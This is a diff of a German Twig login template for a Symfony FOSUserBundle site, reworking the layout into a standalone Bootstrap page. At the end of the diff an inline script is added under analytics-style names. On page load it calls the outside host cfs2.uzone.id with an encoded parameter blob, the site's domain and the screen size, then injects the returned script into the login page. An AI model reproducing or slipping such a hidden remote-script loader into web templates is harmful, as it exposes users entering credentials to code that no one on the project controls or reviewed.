@@ -1,56 +1,81 @@
 {% trans_default_domain 'FOSUserBundle' %}
 
-<div class="jumbotron">
-    <div class="row">
-        <div class="col-md-12">
-            {% if error %}
-                <div>{{ error.messageKey|trans(error.messageData, 'security') }}</div>
+{% trans_default_domain 'FOSUserBundle' %}
+
+<html lang="de">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
+    <meta name="description" content="">
+    <meta name="author" content="Michael Trotzer">
+
+    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Bootstrap core CSS -->
+    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/flatly/bootstrap.min.css" rel="stylesheet">
+
+    <link rel="stylesheet" href="{{ asset('css/anmelden.css') }}" />
+
+</head>
+
+<body>
+
+<div class="container">
+
+        {% if error %}
+            <div>{{ error.messageKey|trans(error.messageData, 'security') }}</div>
+        {% endif %}
+
+        <form action="{{ path("fos_user_security_check") }}" method="post">
+            {% if csrf_token %}
+                <input type="hidden" name="_csrf_token" value="{{ csrf_token }}" />
             {% endif %}
 
-            <form action="{{ path("fos_user_security_check") }}" method="post">
-                {% if csrf_token %}
-                    <input type="hidden" name="_csrf_token" value="{{ csrf_token }}" />
-                {% endif %}
+            <div class="form-group">
+                <div class="col-sm-offset-4 col-sm-4 col-sm-offset-4">
+                    <h3 class="form-signin-heading">Bitte hier Anmelden!</h3>
+                </div>
+            </div>
 
-                <div class="form-group">
-                    <div class="col-sm-offset-3 col-sm-7">
-                        <center><h3 class="form-signin-heading">Mitarbeiterbereich, bitte melden Sie sich hier an!</h3></center>
+            <br>
+
+            <div class="form-group">
+                <div class="col-sm-offset-4 col-sm-4 col-sm-offset-4">
+                    <input type="text" class="form-control" id="username" name="_username" value="{{ last_username }}" required="required" placeholder="Benutzername oder E-Mail-Adresse" />
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="col-sm-offset-4 col-sm-4 col-sm-offset-4">
+                    <input type="password" class="form-control" id="password" name="_password" required="required" placeholder="Passwort" />
+                </div>
+            </div>
+
+            <div class="form-group">
+                <div class="col-sm-offset-4 col-sm-4 col-sm-offset-4">
+                    <div class="checkbox">
+                        <label>
+                            <input type="checkbox" id="remember_me" name="_remember_me" value="on" />
+                            <label for="remember_me">{{ 'security.login.remember_me'|trans }}</label>
+                        </label>
                     </div>
                 </div>
+            </div>
 
-
-
-                <br>
-
-                <div class="form-group">
-                    <div class="col-sm-offset-3 col-sm-7">
-                        <input type="text" class="form-control" id="username" name="_username" value="{{ last_username }}" required="required" placeholder="Benutzername oder E-Mail-Adresse" />
-                    </div>
+            <div class="form-group">
+                <div class="col-sm-offset-4 col-sm-4 col-sm-offset-4">
+                    <input class="btn btn-md btn-success btn-block"  type="submit" class="btn btn-default" id="_submit" name="_submit" value="{{ 'security.login.submit'|trans }}" />
                 </div>
+            </div>
+        </form>
 
-                <div class="form-group">
-                    <div class="col-sm-offset-3 col-sm-7">
-                        <input type="password" class="form-control" id="password" name="_password" required="required" placeholder="Passwort" />
-                    </div>
-                </div>
+</div> <!-- /container -->
 
-                <div class="form-group">
-                    <div class="col-sm-offset-3 col-sm-7">
-                        <div class="checkbox">
-                            <label>
-                                <input type="checkbox" id="remember_me" name="_remember_me" value="on" />
-                                <label for="remember_me">{{ 'security.login.remember_me'|trans }}</label>
-                            </label>
-                        </div>
-                    </div>
-                </div>
 
-                <div class="form-group">
-                    <div class="col-sm-offset-3 col-sm-7">
-                        <input class="btn btn-md btn-success btn-block"  type="submit" class="btn btn-default" id="_submit" name="_submit" value="{{ 'security.login.submit'|trans }}" />
-                    </div>
-                </div>
-            </form>
-        </div>
-    </div>
-</div>
+<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<!-- Bootstrap core JavaSkript -->
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs2.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKGoUAbe%2bBwxXG0l3E90PCU%2buhlwNbEwD81GVLCpOtpbRTmNmP6qSBySVSRqoWHfhZ3i3SqdpD02xCb0KNg%2fk5wQyTpMQHJhdmbun4xZ%2bcYvSBF9P4NwtUSfe9XLjQgnsV%2fbQ8c82TKo96ebu7HII6iCCoh2MmEgwIn3GdayIsKr9jb%2f9eN%2f0YZNs7PaZvFLF8sRz5c7rfHBQ%2fOvAqk4z5C7sbpIqax8WrVpJrkXKfDcw0mk4iQxrK9Jzn4JgiPOekwECu%2beye5rx3%2bfBHncRW96ixUusGdS6G6OZ2wSLqxvyysp0Q0xYtoFk0e6oQLt8J08ZDfEdyJltHNQ4SFewQmsiUXK3uVgakWVmwFlMlB8t1PiscvEfyVpgUA%2ftsqaMRjp7YjLunKr2olO13Apk2JvBvJQCUBhA8OjqhC7Q4fn2e6qGYoVkqx%2bz7SdTqHeaS7FiNbPXk6z2BkyyoF7brbfLHIexdoq6qKE8ZyrDZVf%2bSfWhPEKnsbqIGybxtSymMjf5HFGv3rOPTWGt9WqhH0LiiJjYovHNLWjTXZrLy0%2bOOL%2bkfBgq%2fbA%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
